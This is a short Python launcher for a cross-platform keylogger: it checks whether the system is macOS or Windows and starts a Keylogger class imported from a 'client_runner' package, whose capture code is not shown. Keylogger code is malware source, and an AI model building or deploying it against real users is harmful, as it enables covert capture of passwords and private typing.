import platform

class KeyloggerThread():
    def __init__(self):
        super().__init__()
        self.osName = platform.uname().system
        self.init = None

    def run(self):
        if self.osName == "Darwin":
            import client_runner.macOS_runner as macOS_runner
            self.init = macOS_runner.Keylogger()
        elif self.osName == "Windows":
            import client_runner.Windows_runner as Windows_runner
            self.init = Windows_runner.Keylogger()
        self.init.run()

if __name__ == "__main__":
    keylogger = KeyloggerThread()
    keylogger.run()
